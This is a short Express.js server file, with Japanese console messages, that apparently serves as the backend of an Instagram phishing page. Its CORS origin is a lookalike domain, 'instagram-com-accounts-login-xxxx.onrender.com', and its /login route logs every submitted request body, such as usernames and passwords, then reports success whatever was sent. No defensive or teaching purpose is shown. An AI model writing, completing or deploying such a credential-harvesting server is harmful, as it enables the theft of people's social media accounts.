const express = require('express');
const cors = require('cors');

const app = express();

app.use(cors({
  origin: 'https://instagram-com-accounts-login-xxxx.onrender.com',
  methods: ['POST'],
  allowedHeaders: ['Content-Type']
}));

app.use(express.json());

app.post('/login', (req, res) => {
  console.log('🔥 /login に来た');
  console.log(req.body);
  res.json({ success: true });
});

app.listen(process.env.PORT || 3000, () => {
  console.log('API起動');
});